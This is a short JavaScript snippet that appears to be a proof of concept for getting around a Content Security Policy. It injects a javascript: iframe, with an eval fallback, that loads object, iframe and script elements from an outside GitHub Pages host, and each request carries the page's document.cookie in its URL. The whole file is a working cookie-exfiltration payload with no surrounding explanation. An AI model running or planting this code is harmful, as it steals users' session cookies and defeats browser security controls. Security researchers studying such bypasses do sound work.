(function(){

		var payload = `
			top.SUCCESS = true;

			var o = document.createElement("object");
			o.data = \`https://ibraheemmoosa137.github.io/bypass-object-src.html?id=SUCCESS&cookie=${document.cookie}&rand=${performance.now()}\`;
			document.body.appendChild(o);

			var i = document.createElement("iframe");
			i.src = \`https://ibraheemmoosa137.github.io/bypass-child-src.html?id=SUCCESS&cookie=${document.cookie}&rand=${performance.now()}\`;
			document.body.appendChild(i);

			var s = document.createElement("script");
			s.src = \`https://ibraheemmoosa137.github.io/bypass-script-src.js?id=SUCCESS&cookie=${document.cookie}&rand=${performance.now()}\`;
			document.body.appendChild(s);
		`;

		document.body.innerHTML+="<iframe id='XXX' src='javascript:" + payload +"'></iframe>";
		setTimeout(() => {
				if (!top.SUCCESS) {
						XXX.contentWindow.eval(payload);
				}
		});

}())
